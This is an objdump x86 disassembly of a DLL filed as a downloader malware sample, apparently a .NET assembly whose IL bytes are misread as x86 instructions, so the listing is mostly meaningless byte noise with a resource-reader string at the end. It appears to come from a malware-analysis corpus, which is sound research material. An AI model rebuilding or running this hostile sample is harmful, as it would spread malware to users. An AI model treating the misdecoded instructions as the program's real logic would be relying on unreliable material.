
malware_samples/downloader/f71c3bbd857f2fa79c5ccd19e8576a5d442b75387961cfca52798f6797bfcdf0.dll:     file format pei-i386


Disassembly of section .text:

10002000 <.text>:
10002000:	80 38 00             	cmpb   $0x0,(%eax)
10002003:	00 00                	add    %al,(%eax)
10002005:	00 00                	add    %al,(%eax)
10002007:	00 48 00             	add    %cl,0x0(%eax)
1000200a:	00 00                	add    %al,(%eax)
1000200c:	02 00                	add    (%eax),%al
1000200e:	05 00 6c 26 00       	add    $0x266c00,%eax
10002013:	00 e0                	add    %ah,%al
10002015:	11 00                	adc    %eax,(%eax)
10002017:	00 01                	add    %al,(%ecx)
10002019:	00 00                	add    %al,(%eax)
1000201b:	00 00                	add    %al,(%eax)
1000201d:	00 00                	add    %al,(%eax)
1000201f:	00 b4 25 00 00 b8 00 	add    %dh,0xb80000(%ebp,%eiz,1)
	...
1000204e:	00 00                	add    %al,(%eax)
10002050:	13 30                	adc    (%eax),%esi
10002052:	00 00                	add    %al,(%eax)
10002054:	06                   	push   %es
10002055:	00 00                	add    %al,(%eax)
10002057:	00 00                	add    %al,(%eax)
10002059:	00 00                	add    %al,(%eax)
1000205b:	00 28                	add    %ch,(%eax)
1000205d:	05 00 00 06 2a       	add    $0x2a060000,%eax
10002062:	1e                   	push   %ds
10002063:	02 28                	add    (%eax),%ch
10002065:	01 00                	add    %eax,(%eax)
10002067:	00 0a                	add    %cl,(%edx)
10002069:	2a 00                	sub    (%eax),%al
1000206b:	00 1b                	add    %bl,(%ebx)
1000206d:	30 07                	xor    %al,(%edi)
1000206f:	00 b1 03 00 00 01    	add    %dh,0x1000003(%ecx)
10002075:	00 00                	add    %al,(%eax)
10002077:	11 00                	adc    %eax,(%eax)
10002079:	00 17                	add    %dl,(%edi)
1000207b:	0d 09 05 72 01       	or     $0x1720509,%eax
10002080:	00 00                	add    %al,(%eax)
10002082:	70 6f                	jo     0x100020f3
10002084:	02 00                	add    (%eax),%al
10002086:	00 0a                	add    %cl,(%edx)
10002088:	fe 01                	incb   (%ecx)
1000208a:	13 04 11             	adc    (%ecx,%edx,1),%eax
1000208d:	04 2c                	add    $0x2c,%al
1000208f:	6b 28 03             	imul   $0x3,(%eax),%ebp
10002092:	00 00                	add    %al,(%eax)
10002094:	0a 13                	or     (%ebx),%dl
10002096:	05 16 13 06 2b       	add    $0x2b061316,%eax
1000209b:	51                   	push   %ecx
1000209c:	11 05 11 06 9a 13    	adc    %eax,0x139a0611
100020a2:	07                   	pop    %es
100020a3:	11 07                	adc    %eax,(%edi)
100020a5:	6f                   	outsl  %ds:(%esi),(%dx)
100020a6:	04 00                	add    $0x0,%al
100020a8:	00 0a                	add    %cl,(%edx)
100020aa:	6f                   	outsl  %ds:(%esi),(%dx)
100020ab:	05 00 00 0a 72       	add    $0x720a0000,%eax
100020b0:	05 00 00 70 28       	add    $0x28700000,%eax
100020b5:	05 00 00 0a 6f       	add    $0x6f0a0000,%eax
100020ba:	02 00                	add    (%eax),%al
100020bc:	00 0a                	add    %cl,(%edx)
100020be:	11 07                	adc    %eax,(%edi)
100020c0:	6f                   	outsl  %ds:(%esi),(%dx)
100020c1:	04 00                	add    $0x0,%al
100020c3:	00 0a                	add    %cl,(%edx)
100020c5:	6f                   	outsl  %ds:(%esi),(%dx)
100020c6:	05 00 00 0a 72       	add    $0x720a0000,%eax
100020cb:	17                   	pop    %ss
100020cc:	00 00                	add    %al,(%eax)
100020ce:	70 28                	jo     0x100020f8
100020d0:	05 00 00 0a 6f       	add    $0x6f0a0000,%eax
100020d5:	02 00                	add    (%eax),%al
100020d7:	00 0a                	add    %cl,(%edx)
100020d9:	60                   	pusha
100020da:	13 08                	adc    (%eax),%ecx
100020dc:	11 08                	adc    %ecx,(%eax)
100020de:	2c 05                	sub    $0x5,%al
100020e0:	38 43 03             	cmp    %al,0x3(%ebx)
100020e3:	00 00                	add    %al,(%eax)
100020e5:	00 00                	add    %al,(%eax)
100020e7:	11 06                	adc    %eax,(%esi)
100020e9:	17                   	pop    %ss
100020ea:	d6                   	salc
100020eb:	13 06                	adc    (%esi),%eax
100020ed:	11 06                	adc    %eax,(%esi)
100020ef:	11 05 8e 69 fe 04    	adc    %eax,0x4fe698e
100020f5:	13 09                	adc    (%ecx),%ecx
100020f7:	11 09                	adc    %ecx,(%ecx)
100020f9:	2d a1 00 03 0a       	sub    $0xa0300a1,%eax
100020fe:	7e 06                	jle    0x10002106
10002100:	00 00                	add    %al,(%eax)
10002102:	0a 0b                	or     (%ebx),%cl
10002104:	03 73 07             	add    0x7(%ebx),%esi
10002107:	00 00                	add    %al,(%eax)
10002109:	0a 0c 03             	or     (%ebx,%eax,1),%cl
1000210c:	6f                   	outsl  %ds:(%esi),(%dx)
1000210d:	08 00                	or     %al,(%eax)
1000210f:	00 0a                	add    %cl,(%edx)
10002111:	6f                   	outsl  %ds:(%esi),(%dx)
10002112:	09 00                	or     %eax,(%eax)
10002114:	00 0a                	add    %cl,(%edx)
10002116:	72 2d                	jb     0x10002145
10002118:	00 00                	add    %al,(%eax)
1000211a:	70 28                	jo     0x10002144
1000211c:	08 00                	or     %al,(%eax)
1000211e:	00 0a                	add    %cl,(%edx)
10002120:	6f                   	outsl  %ds:(%esi),(%dx)
10002121:	02 00                	add    (%eax),%al
10002123:	00 0a                	add    %cl,(%edx)
10002125:	13 0a                	adc    (%edx),%ecx
10002127:	11 0a                	adc    %ecx,(%edx)
10002129:	2c 09                	sub    $0x9,%al
1000212b:	72 35                	jb     0x10002162
1000212d:	00 00                	add    %al,(%eax)
1000212f:	70 0b                	jo     0x1000213c
10002131:	00 2b                	add    %ch,(%ebx)
10002133:	23 00                	and    (%eax),%eax
10002135:	03 6f 08             	add    0x8(%edi),%ebp
10002138:	00 00                	add    %al,(%eax)
1000213a:	0a 6f 09             	or     0x9(%edi),%ch
1000213d:	00 00                	add    %al,(%eax)
1000213f:	0a 72 3f             	or     0x3f(%edx),%dh
10002142:	00 00                	add    %al,(%eax)
10002144:	70 28                	jo     0x1000216e
10002146:	08 00                	or     %al,(%eax)
10002148:	00 0a                	add    %cl,(%edx)
1000214a:	6f                   	outsl  %ds:(%esi),(%dx)
1000214b:	02 00                	add    (%eax),%al
1000214d:	00 0a                	add    %cl,(%edx)
1000214f:	26 72 45             	es jb  0x10002197
10002152:	00 00                	add    %al,(%eax)
10002154:	70 0b                	jo     0x10002161
10002156:	00 00                	add    %al,(%eax)
10002158:	17                   	pop    %ss
10002159:	13 0b                	adc    (%ebx),%ecx
1000215b:	11 0b                	adc    %ecx,(%ebx)
1000215d:	05 72 4d 00 00       	add    $0x4d72,%eax
10002162:	70 6f                	jo     0x100021d3
10002164:	02 00                	add    (%eax),%al
10002166:	00 0a                	add    %cl,(%edx)
10002168:	fe 01                	incb   (%ecx)
1000216a:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
1000216d:	0c 39                	or     $0x39,%al
1000216f:	02 01                	add    (%ecx),%al
10002171:	00 00                	add    %al,(%eax)
10002173:	00 1b                	add    %bl,(%ebx)
10002175:	8d 06                	lea    (%esi),%eax
10002177:	00 00                	add    %al,(%eax)
10002179:	01 25 16 72 51 00    	add    %esp,0x517216
1000217f:	00 70 a2             	add    %dh,-0x5e(%eax)
10002182:	25 17 04 a2 25       	and    $0x25a20417,%eax
10002187:	18 72 0e             	sbb    %dh,0xe(%edx)
1000218a:	01 00                	add    %eax,(%eax)
1000218c:	70 a2                	jo     0x10002130
1000218e:	25 19 28 0a 00       	and    $0xa2819,%eax
10002193:	00 0a                	add    %cl,(%edx)
10002195:	a2 25 1a 72 74       	mov    %al,0x74721a25
1000219a:	01 00                	add    %eax,(%eax)
1000219c:	70 a2                	jo     0x10002140
1000219e:	28 0b                	sub    %cl,(%ebx)
100021a0:	00 00                	add    %al,(%eax)
100021a2:	0a 13                	or     (%ebx),%dl
100021a4:	0d 28 0a 00 00       	or     $0xa28,%eax
100021a9:	0a 72 de             	or     -0x22(%edx),%dh
100021ac:	01 00                	add    %eax,(%eax)
100021ae:	70 28                	jo     0x100021d8
100021b0:	0c 00                	or     $0x0,%al
100021b2:	00 0a                	add    %cl,(%edx)
100021b4:	11 0d 28 0d 00 00    	adc    %ecx,0xd28
100021ba:	0a 00                	or     (%eax),%al
100021bc:	72 ee                	jb     0x100021ac
100021be:	01 00                	add    %eax,(%eax)
100021c0:	70 28                	jo     0x100021ea
100021c2:	0a 00                	or     (%eax),%al
100021c4:	00 0a                	add    %cl,(%edx)
100021c6:	72 de                	jb     0x100021a6
100021c8:	01 00                	add    %eax,(%eax)
100021ca:	70 28                	jo     0x100021f4
100021cc:	0e                   	push   %cs
100021cd:	00 00                	add    %al,(%eax)
100021cf:	0a 16                	or     (%esi),%dl
100021d1:	16                   	push   %ss
100021d2:	15 28 0f 00 00       	adc    $0xf28,%eax
100021d7:	0a 26                	or     (%esi),%ah
100021d9:	1b 8d 06 00 00 01    	sbb    0x1000006(%ebp),%ecx
100021df:	25 16 72 89 02       	and    $0x2897216,%eax
100021e4:	00 70 a2             	add    %dh,-0x5e(%eax)
100021e7:	25 17 03 a2 25       	and    $0x25a20317,%eax
100021ec:	18 72 bf             	sbb    %dh,-0x41(%edx)
100021ef:	02 00                	add    (%eax),%al
100021f1:	70 a2                	jo     0x10002195
100021f3:	25 19 28 0a 00       	and    $0xa2819,%eax
100021f8:	00 0a                	add    %cl,(%edx)
100021fa:	a2 25 1a 72 e1       	mov    %al,0xe1721a25
100021ff:	02 00                	add    (%eax),%al
10002201:	70 a2                	jo     0x100021a5
10002203:	28 0b                	sub    %cl,(%ebx)
10002205:	00 00                	add    %al,(%eax)
10002207:	0a 16                	or     (%esi),%dl
10002209:	16                   	push   %ss
1000220a:	15 28 0f 00 00       	adc    $0xf28,%eax
1000220f:	0a 26                	or     (%esi),%ah
10002211:	72 e5                	jb     0x100021f8
10002213:	02 00                	add    (%eax),%al
10002215:	70 13                	jo     0x1000222a
10002217:	0e                   	push   %cs
10002218:	1b 8d 06 00 00 01    	sbb    0x1000006(%ebp),%ecx
1000221e:	25 16 11 0e a2       	and    $0xa20e1116,%eax
10002223:	25 17 72 39 03       	and    $0x3397217,%eax
10002228:	00 70 a2             	add    %dh,-0x5e(%eax)
1000222b:	25 18 28 0a 00       	and    $0xa2818,%eax
10002230:	00 0a                	add    %cl,(%edx)
10002232:	a2 25 19 08 6f       	mov    %al,0x6f081925
10002237:	10 00                	adc    %al,(%eax)
10002239:	00 0a                	add    %cl,(%edx)
1000223b:	a2 25 1a 72 da       	mov    %al,0xda721a25
10002240:	03 00                	add    (%eax),%eax
10002242:	70 a2                	jo     0x100021e6
10002244:	28 0b                	sub    %cl,(%ebx)
10002246:	00 00                	add    %al,(%eax)
10002248:	0a 13                	or     (%ebx),%dl
1000224a:	0e                   	push   %cs
1000224b:	28 0a                	sub    %cl,(%edx)
1000224d:	00 00                	add    %al,(%eax)
1000224f:	0a 72 f4             	or     -0xc(%edx),%dh
10002252:	03 00                	add    (%eax),%eax
10002254:	70 28                	jo     0x1000227e
10002256:	0c 00                	or     $0x0,%al
10002258:	00 0a                	add    %cl,(%edx)
1000225a:	11 0e                	adc    %ecx,(%esi)
1000225c:	28 0d 00 00 0a 00    	sub    %cl,0xa0000
10002262:	de 10                	ficoms (%eax)
10002264:	25 28 11 00 00       	and    $0x1128,%eax
10002269:	0a 13                	or     (%ebx),%dl
1000226b:	0f 00 28             	verw   (%eax)
1000226e:	12 00                	adc    (%eax),%al
10002270:	00 0a                	add    %cl,(%edx)
10002272:	de 00                	fiadds (%eax)
10002274:	00 00                	add    %al,(%eax)
10002276:	00 17                	add    %dl,(%edi)
10002278:	13 10                	adc    (%eax),%edx
1000227a:	11 10                	adc    %edx,(%eax)
1000227c:	05 72 04 04 00       	add    $0x40472,%eax
10002281:	70 6f                	jo     0x100022f2
10002283:	02 00                	add    (%eax),%al
10002285:	00 0a                	add    %cl,(%edx)
10002287:	fe 01                	incb   (%ecx)
10002289:	13 11                	adc    (%ecx),%edx
1000228b:	11 11                	adc    %edx,(%ecx)
1000228d:	2c 38                	sub    $0x38,%al
1000228f:	1b 8d 06 00 00 01    	sbb    0x1000006(%ebp),%ecx
10002295:	25 16 72 89 02       	and    $0x2897216,%eax
1000229a:	00 70 a2             	add    %dh,-0x5e(%eax)
1000229d:	25 17 03 a2 25       	and    $0x25a20317,%eax
100022a2:	18 72 bf             	sbb    %dh,-0x41(%edx)
100022a5:	02 00                	add    (%eax),%al
100022a7:	70 a2                	jo     0x1000224b
100022a9:	25 19 28 0a 00       	and    $0xa2819,%eax
100022ae:	00 0a                	add    %cl,(%edx)
100022b0:	a2 25 1a 72 e1       	mov    %al,0xe1721a25
100022b5:	02 00                	add    (%eax),%al
100022b7:	70 a2                	jo     0x1000225b
100022b9:	28 0b                	sub    %cl,(%ebx)
100022bb:	00 00                	add    %al,(%eax)
100022bd:	0a 16                	or     (%esi),%dl
100022bf:	16                   	push   %ss
100022c0:	15 28 0f 00 00       	adc    $0xf28,%eax
100022c5:	0a 26                	or     (%esi),%ah
100022c7:	00 00                	add    %al,(%eax)
100022c9:	20 00                	and    %al,(%eax)
100022cb:	0c 00                	or     $0x0,%al
100022cd:	00 28                	add    %ch,(%eax)
100022cf:	13 00                	adc    (%eax),%eax
100022d1:	00 0a                	add    %cl,(%edx)
100022d3:	00 72 08             	add    %dh,0x8(%edx)
100022d6:	04 00                	add    $0x0,%al
100022d8:	70 13                	jo     0x100022ed
100022da:	12 73 14             	adc    0x14(%ebx),%dh
100022dd:	00 00                	add    %al,(%eax)
100022df:	0a 13                	or     (%ebx),%dl
100022e1:	13 11                	adc    (%ecx),%edx
100022e3:	13 28                	adc    (%eax),%ebp
100022e5:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
100022ea:	16                   	push   %ss
100022eb:	00 00                	add    %al,(%eax)
100022ed:	0a 00                	or     (%eax),%al
100022ef:	11 13                	adc    %edx,(%ebx)
100022f1:	11 12                	adc    %edx,(%edx)
100022f3:	28 17                	sub    %dl,(%edi)
100022f5:	00 00                	add    %al,(%eax)
100022f7:	0a 6f 18             	or     0x18(%edi),%ch
100022fa:	00 00                	add    %al,(%eax)
100022fc:	0a 13                	or     (%ebx),%dl
100022fe:	14 11                	adc    $0x11,%al
10002300:	14 28                	adc    $0x28,%al
10002302:	17                   	pop    %ss
10002303:	00 00                	add    %al,(%eax)
10002305:	0a 13                	or     (%ebx),%dl
10002307:	14 11                	adc    $0x11,%al
10002309:	14 72                	adc    $0x72,%al
1000230b:	b1 04                	mov    $0x4,%cl
1000230d:	00 70 72             	add    %dh,0x72(%eax)
10002310:	b9 04 00 70 6f       	mov    $0x6f700004,%ecx
10002315:	19 00                	sbb    %eax,(%eax)
10002317:	00 0a                	add    %cl,(%edx)
10002319:	13 14 02             	adc    (%edx,%eax,1),%edx
1000231c:	28 17                	sub    %dl,(%edi)
1000231e:	00 00                	add    %al,(%eax)
10002320:	0a 13                	or     (%ebx),%dl
10002322:	15 73 14 00 00       	adc    $0x1473,%eax
10002327:	0a 13                	or     (%ebx),%dl
10002329:	16                   	push   %ss
1000232a:	7e 06                	jle    0x10002332
1000232c:	00 00                	add    %al,(%eax)
1000232e:	0a 13                	or     (%ebx),%dl
10002330:	17                   	pop    %ss
10002331:	00 17                	add    %dl,(%edi)
10002333:	13 19                	adc    (%ecx),%ebx
10002335:	11 19                	adc    %ebx,(%ecx)
10002337:	11 15 6f 05 00 00    	adc    %edx,0x56f
1000233d:	0a 72 bd             	or     -0x43(%edx),%dh
10002340:	04 00                	add    $0x0,%al
10002342:	70 28                	jo     0x1000236c
10002344:	05 00 00 0a 6f       	add    $0x6f0a0000,%eax
10002349:	02 00                	add    (%eax),%al
1000234b:	00 0a                	add    %cl,(%edx)
1000234d:	fe 01                	incb   (%ecx)
1000234f:	13 1a                	adc    (%edx),%ebx
10002351:	11 1a                	adc    %ebx,(%edx)
10002353:	2c 27                	sub    $0x27,%al
10002355:	73 14                	jae    0x1000236b
10002357:	00 00                	add    %al,(%eax)
10002359:	0a 11                	or     (%ecx),%dl
1000235b:	15 28 18 00 00       	adc    $0x1828,%eax
10002360:	0a 13                	or     (%ebx),%dl
10002362:	17                   	pop    %ss
10002363:	73 14                	jae    0x10002379
10002365:	00 00                	add    %al,(%eax)
10002367:	0a 11                	or     (%ecx),%dl
10002369:	17                   	pop    %ss
1000236a:	28 18                	sub    %bl,(%eax)
1000236c:	00 00                	add    %al,(%eax)
1000236e:	0a 13                	or     (%ebx),%dl
10002370:	17                   	pop    %ss
10002371:	11 17                	adc    %edx,(%edi)
10002373:	28 17                	sub    %dl,(%edi)
10002375:	00 00                	add    %al,(%eax)
10002377:	0a 13                	or     (%ebx),%dl
10002379:	17                   	pop    %ss
1000237a:	2b 1f                	sub    (%edi),%ebx
1000237c:	11 19                	adc    %ebx,(%ecx)
1000237e:	13 1a                	adc    (%edx),%ebx
10002380:	11 1a                	adc    %ebx,(%edx)
10002382:	2c 17                	sub    $0x17,%al
10002384:	73 14                	jae    0x1000239a
10002386:	00 00                	add    %al,(%eax)
10002388:	0a 11                	or     (%ecx),%dl
1000238a:	15 28 18 00 00       	adc    $0x1828,%eax
1000238f:	0a 13                	or     (%ebx),%dl
10002391:	17                   	pop    %ss
10002392:	11 17                	adc    %edx,(%edi)
10002394:	28 17                	sub    %dl,(%edi)
10002396:	00 00                	add    %al,(%eax)
10002398:	0a 13                	or     (%ebx),%dl
1000239a:	17                   	pop    %ss
1000239b:	00 72 cf             	add    %dh,-0x31(%edx)
1000239e:	04 00                	add    $0x0,%al
100023a0:	70 28                	jo     0x100023ca
100023a2:	17                   	pop    %ss
100023a3:	00 00                	add    %al,(%eax)
100023a5:	0a 13                	or     (%ebx),%dl
100023a7:	18 11                	sbb    %dl,(%ecx)
100023a9:	18 72 15             	sbb    %dh,0x15(%edx)
100023ac:	05 00 70 28 17       	add    $0x17287000,%eax
100023b1:	00 00                	add    %al,(%eax)
100023b3:	0a 28                	or     (%eax),%ch
100023b5:	0c 00                	or     $0x0,%al
100023b7:	00 0a                	add    %cl,(%edx)
100023b9:	13 18                	adc    (%eax),%ebx
100023bb:	28 1a                	sub    %bl,(%edx)
100023bd:	00 00                	add    %al,(%eax)
100023bf:	0a 11                	or     (%ecx),%dl
100023c1:	14 28                	adc    $0x28,%al
100023c3:	1b 00                	sbb    (%eax),%eax
100023c5:	00 0a                	add    %cl,(%edx)
100023c7:	6f                   	outsl  %ds:(%esi),(%dx)
100023c8:	1c 00                	sbb    $0x0,%al
100023ca:	00 0a                	add    %cl,(%edx)
100023cc:	72 2d                	jb     0x100023fb
100023ce:	05 00 70 6f 1d       	add    $0x1d6f7000,%eax
100023d3:	00 00                	add    %al,(%eax)
100023d5:	0a 72 49             	or     0x49(%edx),%dh
100023d8:	05 00 70 6f 1e       	add    $0x1e6f7000,%eax
100023dd:	00 00                	add    %al,(%eax)
100023df:	0a 14 18             	or     (%eax,%ebx,1),%dl
100023e2:	8d 01                	lea    (%ecx),%eax
100023e4:	00 00                	add    %al,(%eax)
100023e6:	01 25 16 11 18 72    	add    %esp,0x72181116
100023ec:	57                   	push   %edi
100023ed:	05 00 70 28 0c       	add    $0xc287000,%eax
100023f2:	00 00                	add    %al,(%eax)
100023f4:	0a a2 25 17 11 17    	or     0x17111725(%edx),%ah
100023fa:	28 1b                	sub    %bl,(%ebx)
100023fc:	00 00                	add    %al,(%eax)
100023fe:	0a a2 6f 1f 00 00    	or     0x1f6f(%edx),%ah
10002404:	0a 26                	or     (%esi),%ah
10002406:	de 1f                	ficomps (%edi)
10002408:	25 28 11 00 00       	and    $0x1128,%eax
1000240d:	0a 13                	or     (%ebx),%dl
1000240f:	1b 00                	sbb    (%eax),%eax
10002411:	11 1b                	adc    %ebx,(%ebx)
10002413:	6f                   	outsl  %ds:(%esi),(%dx)
10002414:	20 00                	and    %al,(%eax)
10002416:	00 0a                	add    %cl,(%edx)
10002418:	16                   	push   %ss
10002419:	14 28                	adc    $0x28,%al
1000241b:	21 00                	and    %eax,(%eax)
1000241d:	00 0a                	add    %cl,(%edx)
1000241f:	26 28 12             	sub    %dl,%es:(%edx)
10002422:	00 00                	add    %al,(%eax)
10002424:	0a de                	or     %dh,%bl
10002426:	00 00                	add    %al,(%eax)
10002428:	2a 00                	sub    (%eax),%al
1000242a:	00 00                	add    %al,(%eax)
1000242c:	41                   	inc    %ecx
1000242d:	34 00                	xor    $0x0,%al
1000242f:	00 00                	add    %al,(%eax)
10002431:	00 00                	add    %al,(%eax)
10002433:	00 fb                	add    %bh,%bl
10002435:	00 00                	add    %al,(%eax)
10002437:	00 f1                	add    %dh,%cl
10002439:	00 00                	add    %al,(%eax)
1000243b:	00 ec                	add    %ch,%ah
1000243d:	01 00                	add    %eax,(%eax)
1000243f:	00 10                	add    %dl,(%eax)
10002441:	00 00                	add    %al,(%eax)
10002443:	00 04 00             	add    %al,(%eax,%eax,1)
10002446:	00 01                	add    %al,(%ecx)
10002448:	00 00                	add    %al,(%eax)
1000244a:	00 00                	add    %al,(%eax)
1000244c:	50                   	push   %eax
1000244d:	02 00                	add    (%eax),%al
1000244f:	00 40 01             	add    %al,0x1(%eax)
10002452:	00 00                	add    %al,(%eax)
10002454:	90                   	nop
10002455:	03 00                	add    (%eax),%eax
10002457:	00 1f                	add    %bl,(%edi)
10002459:	00 00                	add    %al,(%eax)
1000245b:	00 04 00             	add    %al,(%eax,%eax,1)
1000245e:	00 01                	add    %al,(%ecx)
10002460:	2e 73 01             	jae,pn 0x10002464
10002463:	00 00                	add    %al,(%eax)
10002465:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
1000246b:	2a 1b                	sub    (%ebx),%bl
1000246d:	30 03                	xor    %al,(%ebx)
1000246f:	00 52 00             	add    %dl,0x0(%edx)
10002472:	00 00                	add    %al,(%eax)
10002474:	00 00                	add    %al,(%eax)
10002476:	00 00                	add    %al,(%eax)
10002478:	7e 02                	jle    0x1000247c
1000247a:	00 00                	add    %al,(%eax)
1000247c:	04 2c                	add    $0x2c,%al
1000247e:	03 17                	add    (%edi),%edx
10002480:	2b 03                	sub    (%ebx),%eax
10002482:	16                   	push   %ss
10002483:	2b 00                	sub    (%eax),%eax
10002485:	2d 42 7e 01 00       	sub    $0x17e42,%eax
1000248a:	00 04 28             	add    %al,(%eax,%ebp,1)
1000248d:	22 00                	and    (%eax),%al
1000248f:	00 0a                	add    %cl,(%edx)
10002491:	7e 02                	jle    0x10002495
10002493:	00 00                	add    %al,(%eax)
10002495:	04 2c                	add    $0x2c,%al
10002497:	03 17                	add    (%edi),%edx
10002499:	2b 03                	sub    (%ebx),%eax
1000249b:	16                   	push   %ss
1000249c:	2b 00                	sub    (%eax),%eax
1000249e:	2d 1c 28 1a 00       	sub    $0x1a281c,%eax
100024a3:	00 0a                	add    %cl,(%edx)
100024a5:	14 fe                	adc    $0xfe,%al
100024a7:	06                   	push   %es
100024a8:	06                   	push   %es
100024a9:	00 00                	add    %al,(%eax)
100024ab:	06                   	push   %es
100024ac:	73 23                	jae    0x100024d1
100024ae:	00 00                	add    %al,(%eax)
100024b0:	0a 6f 24             	or     0x24(%edi),%ch
100024b3:	00 00                	add    %al,(%eax)
100024b5:	0a 17                	or     (%edi),%dl
100024b7:	80 02 00             	addb   $0x0,(%edx)
100024ba:	00 04 de             	add    %al,(%esi,%ebx,8)
100024bd:	0b 7e 01             	or     0x1(%esi),%edi
100024c0:	00 00                	add    %al,(%eax)
100024c2:	04 28                	add    $0x28,%al
100024c4:	25 00 00 0a dc       	and    $0xdc0a0000,%eax
100024c9:	2a 00                	sub    (%eax),%al
100024cb:	00 01                	add    %al,(%ecx)
100024cd:	10 00                	adc    %al,(%eax)
100024cf:	00 02                	add    %al,(%edx)
100024d1:	00 0f                	add    %cl,(%edi)
100024d3:	00 37                	add    %dh,(%edi)
100024d5:	46                   	inc    %esi
100024d6:	00 0b                	add    %cl,(%ebx)
100024d8:	00 00                	add    %al,(%eax)
100024da:	00 00                	add    %al,(%eax)
100024dc:	32 03                	xor    (%ebx),%al
100024de:	6f                   	outsl  %ds:(%esi),(%dx)
100024df:	26 00 00             	add    %al,%es:(%eax)
100024e2:	0a 28                	or     (%eax),%ch
100024e4:	07                   	pop    %es
100024e5:	00 00                	add    %al,(%eax)
100024e7:	06                   	push   %es
100024e8:	2a 00                	sub    (%eax),%al
100024ea:	00 00                	add    %al,(%eax)
100024ec:	1b 30                	sbb    (%eax),%esi
100024ee:	03 00                	add    (%eax),%eax
100024f0:	a3 00 00 00 02       	mov    %eax,0x2000000
100024f5:	00 00                	add    %al,(%eax)
100024f7:	11 00                	adc    %eax,(%eax)
100024f9:	02 6f 27             	add    0x27(%edi),%ch
100024fc:	00 00                	add    %al,(%eax)
100024fe:	0a 16                	or     (%esi),%dl
10002500:	9a 1f 28 6f 28 00 00 	lcall  $0x0,$0x286f281f
10002507:	0a 0a                	or     (%edx),%cl
10002509:	2b 1f                	sub    (%edi),%ebx
1000250b:	11 04 45 06 00 00 00 	adc    %eax,0x6(,%eax,2)
10002512:	05 00 00 00 0c       	add    $0xc000000,%eax
10002517:	00 00                	add    %al,(%eax)
10002519:	00 13                	add    %dl,(%ebx)
1000251b:	00 00                	add    %al,(%eax)
1000251d:	00 2a                	add    %ch,(%edx)
1000251f:	00 00                	add    %al,(%eax)
10002521:	00 33                	add    %dh,(%ebx)
10002523:	00 00                	add    %al,(%eax)
10002525:	00 3b                	add    %bh,(%ebx)
10002527:	00 00                	add    %al,(%eax)
10002529:	00 16                	add    %dl,(%esi)
1000252b:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
1000252e:	dc 14 0b             	fcoml  (%ebx,%ecx,1)
10002531:	17                   	pop    %ss
10002532:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
10002535:	d5 16                	aad    $0x16
10002537:	0c 1a                	or     $0x1a,%al
10002539:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
1000253c:	ce                   	into
1000253d:	09 6f 29             	or     %ebp,0x29(%edi)
10002540:	00 00                	add    %al,(%eax)
10002542:	0a 72 71             	or     0x71(%edx),%dh
10002545:	05 00 70 28 2a       	add    $0x2a287000,%eax
1000254a:	00 00                	add    %al,(%eax)
1000254c:	0a 2c 19             	or     (%ecx,%ebx,1),%ch
1000254f:	1b 13                	sbb    (%ebx),%edx
10002551:	04 2b                	add    $0x2b,%al
10002553:	b7 06                	mov    $0x6,%bh
10002555:	08 9a 0d 18 13 04    	or     %bl,0x413180d(%edx)
1000255b:	2b ae 08 2c 15 19    	sub    0x19152c08(%esi),%ebp
10002561:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
10002564:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
10002565:	16                   	push   %ss
10002566:	2b 03                	sub    (%ebx),%eax
10002568:	17                   	pop    %ss
10002569:	2b 00                	sub    (%eax),%eax
1000256b:	2d 04 09 0b 2b       	sub    $0x2b0b0904,%eax
10002570:	0a 08                	or     (%eax),%cl
10002572:	17                   	pop    %ss
10002573:	58                   	pop    %eax
10002574:	0c 08                	or     $0x8,%al
10002576:	06                   	push   %es
10002577:	8e 69 32             	mov    0x32(%ecx),%gs
1000257a:	d9 07                	flds   (%edi)
1000257c:	14 28                	adc    $0x28,%al
1000257e:	2b 00                	sub    (%eax),%eax
10002580:	00 0a                	add    %cl,(%edx)
10002582:	2c 03                	sub    $0x3,%al
10002584:	16                   	push   %ss
10002585:	2b 03                	sub    (%ebx),%eax
10002587:	17                   	pop    %ss
10002588:	2b 00                	sub    (%eax),%eax
1000258a:	2d 09 07 14 14       	sub    $0x14140709,%eax
1000258f:	6f                   	outsl  %ds:(%esi),(%dx)
10002590:	1f                   	pop    %ds
10002591:	00 00                	add    %al,(%eax)
10002593:	0a 26                	or     (%esi),%ah
10002595:	de 03                	fiadds (%ebx)
10002597:	26 de 00             	fiadds %es:(%eax)
1000259a:	2a 00                	sub    (%eax),%al
1000259c:	01 10                	add    %edx,(%eax)
1000259e:	00 00                	add    %al,(%eax)
100025a0:	00 00                	add    %al,(%eax)
100025a2:	01 00                	add    %eax,(%eax)
100025a4:	9e                   	sahf
100025a5:	9f                   	lahf
100025a6:	00 03                	add    %al,(%ebx)
100025a8:	04 00                	add    $0x0,%al
100025aa:	00 01                	add    %al,(%ecx)
100025ac:	1e                   	push   %ds
100025ad:	02 28                	add    (%eax),%ch
100025af:	01 00                	add    %eax,(%eax)
100025b1:	00 0a                	add    %cl,(%edx)
100025b3:	2a b4 00 00 00 ce ca 	sub    -0x35320000(%eax,%eax,1),%dh
100025ba:	ef                   	out    %eax,(%dx)
100025bb:	be 01 00 00 00       	mov    $0x1,%esi
100025c0:	91                   	xchg   %eax,%ecx
100025c1:	00 00                	add    %al,(%eax)
100025c3:	00 6c 53 79          	add    %ch,0x79(%ebx,%edx,2)
100025c7:	73 74                	jae    0x1000263d
100025c9:	65 6d                	gs insl (%dx),%es:(%edi)
100025cb:	2e 52                	cs push %edx
100025cd:	65 73 6f             	gs jae 0x1000263f
100025d0:	75 72                	jne    0x10002644
100025d2:	63 65 73             	arpl   %esp,0x73(%ebp)
100025d5:	2e 52                	cs push %edx
100025d7:	65 73 6f             	gs jae 0x10002649
100025da:	75 72                	jne    0x1000264e
100025dc:	63 65 52             	arpl   %esp,0x52(%ebp)
100025df:	65 61                	gs popa
100025e1:	64 65 72 2c          	fs gs jb 0x10002611
100025e5:	20 6d 73             	and    %ch,0x73(%ebp)
100025e8:	63 6f 72             	arpl   %ebp,0x72(%edi)
100025eb:	6c                   	insb   (%dx),%es:(%edi)
100025ec:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%edx),%esp
100025f3:	73 69                	jae    0x1000265e
